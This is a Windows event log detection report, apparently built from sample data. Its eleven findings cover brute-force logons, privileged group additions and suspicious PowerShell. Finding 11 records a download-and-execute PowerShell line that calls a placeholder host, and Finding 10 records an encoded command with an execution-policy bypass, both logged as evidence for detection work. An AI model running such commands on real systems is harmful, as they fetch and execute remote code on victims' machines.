# Windows Event Log Detection Report

Generated: 2026-06-06 15:58:16 UTC

## Executive Summary

- Events analyzed: 14
- Rules loaded: 4
- Findings generated: 11
- Critical findings: 2
- High findings: 3
- Medium findings: 6

## Detection Findings

### Finding 1: Possible Brute Force Followed By Successful Logon

- Rule ID: win-bruteforce-001
- Severity: High
- Summary: 5 failed logons followed by a successful logon.
- Timestamp: 2026-06-06T08:01:10Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4624, 4625
- Related Event Count: 6
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Review authentication logs, validate the source IP, and consider password reset or account lockout.

### Finding 2: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T08:01:10Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 3: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T08:01:34Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 4: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T08:02:02Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 5: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T08:02:41Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 6: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T08:03:15Z
- Hostname: DC-01
- Username: j.smith
- Source IP: 203.0.113.44
- Process: -
- Command Line: -
- Target User: j.smith
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 7: Windows Failed Logon

- Rule ID: win-failedlogon-001
- Severity: Medium
- Summary: Failed Windows logon event detected.
- Timestamp: 2026-06-06T11:20:16Z
- Hostname: VPN-01
- Username: r.patel
- Source IP: 198.51.100.88
- Process: -
- Command Line: -
- Target User: r.patel
- Group Name: -
- Related Event IDs: 4625
- Related Event Count: 1
- MITRE ATT&CK: Credential Access - T1110 Brute Force
- Recommended Action: Check whether the failure is isolated or part of a larger authentication pattern.

### Finding 8: Privileged Group Membership Change

- Rule ID: win-privilege-001
- Severity: Critical
- Summary: User m.chen was added to privileged group Administrators.
- Timestamp: 2026-06-06T10:44:08Z
- Hostname: DC-01
- Username: admin.temp
- Source IP: 10.10.5.20
- Process: -
- Command Line: -
- Target User: m.chen
- Group Name: Administrators
- Related Event IDs: 4732
- Related Event Count: 1
- MITRE ATT&CK: Persistence - T1098 Account Manipulation
- Recommended Action: Confirm the change was approved, review the actor account, and remove unauthorized privileged access immediately.

### Finding 9: Privileged Group Membership Change

- Rule ID: win-privilege-001
- Severity: Critical
- Summary: User m.chen was added to privileged group Domain Admins.
- Timestamp: 2026-06-06T10:47:33Z
- Hostname: DC-01
- Username: admin.temp
- Source IP: 10.10.5.20
- Process: -
- Command Line: -
- Target User: m.chen
- Group Name: Domain Admins
- Related Event IDs: 4728
- Related Event Count: 1
- MITRE ATT&CK: Persistence - T1098 Account Manipulation
- Recommended Action: Confirm the change was approved, review the actor account, and remove unauthorized privileged access immediately.

### Finding 10: Suspicious PowerShell Execution

- Rule ID: win-powershell-001
- Severity: High
- Summary: Suspicious PowerShell behavior detected in process or script block logs.
- Timestamp: 2026-06-06T09:12:21Z
- Hostname: HR-WS-022
- Username: a.johnson
- Source IP: -
- Process: powershell.exe
- Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=
- Target User: -
- Group Name: -
- Related Event IDs: 4688
- Related Event Count: 1
- MITRE ATT&CK: Execution - T1059.001 PowerShell
- Recommended Action: Collect the full command line, review parent process activity, and check endpoint telemetry for downloaded payloads.

### Finding 11: Suspicious PowerShell Execution

- Rule ID: win-powershell-001
- Severity: High
- Summary: Suspicious PowerShell behavior detected in process or script block logs.
- Timestamp: 2026-06-06T09:12:24Z
- Hostname: HR-WS-022
- Username: a.johnson
- Source IP: -
- Process: powershell.exe
- Command Line: IEX (New-Object Net.WebClient).DownloadString('hxxp://example-update.local/a.ps1')
- Target User: -
- Group Name: -
- Related Event IDs: 4104
- Related Event Count: 1
- MITRE ATT&CK: Execution - T1059.001 PowerShell
- Recommended Action: Collect the full command line, review parent process activity, and check endpoint telemetry for downloaded payloads.
